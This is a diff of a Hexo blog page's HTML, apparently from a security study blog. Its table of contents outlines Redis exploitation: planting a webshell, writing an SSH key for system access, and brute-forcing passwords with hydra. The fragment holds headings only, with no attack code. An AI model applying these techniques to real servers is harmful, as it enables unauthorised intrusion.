+                <a href="/c1y2m3.github.io/2018/09/29/ Cobalt Strike学习笔记/" class="ui tiny button">
+
+                    <i class="angle left icon"></i>
+                    
+                    Cobalt Strike学习笔记
+                    
+
+                </a>
+
+                
+            </div>
+            <div class="column nav-right">
+                
+
+                <a href="/c1y2m3.github.io/2018/09/16/【VULNERABLITY】文件上传绕过总结/" class="ui tiny button">
+                    
+                    文件上传绕过总结
+                    
+                    <i class="angle right icon"></i></a>
+                
+            </div>
+        </div>
+    </div>
+
+</div>
+                
+            </div>
+
+            
+            <div class="three wide computer three wide tablet column">
+
+                <div class="ui sticky article-toc" id="article-toc">
+                    <!-- toc -->
+                    <ol class="ui ordered list"><li><a href="#REmote-DIctionary-Server-Redis-是一个key-value数据库"><span>REmote DIctionary Server(Redis)是一个key-value数据库</span></a></li></ol><li><a href="#在web目录下写入webshell"><span>在web目录下写入webshell</span></a></li><li><a href="#写入ssh公钥，获取操作系统权限"><span>写入ssh公钥，获取操作系统权限</span></a></li><li><a href="#利用hydra暴力破解redis的密码"><span>利用hydra暴力破解redis的密码</span></a>
+                </li></div>
+
+            </div>
+            
+
+        </div>
+    </div>
+</div>
+
+
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        </div>
+        <div class="ui vertical footer segment">
+    <div class="ui center aligned container">
+        <div class="ui inverted section divider"></div>
+        &copy; 2019 <a href="/">John Doe</a>,
+        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+</div>
 
     </div>
+
+
+
+
+<!-- scripts list from theme config.yml -->
+
+<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+
+<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+
+<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+
+<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
+
+<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
+
+<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
+
+
+
 </body>
 </html>
-<!-- styles -->
-<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
-
-<!-- jquery -->
-<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-<script src="/c1y2m3.github.io/js/main.js"></script>
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Disqus Comments -->
-
-
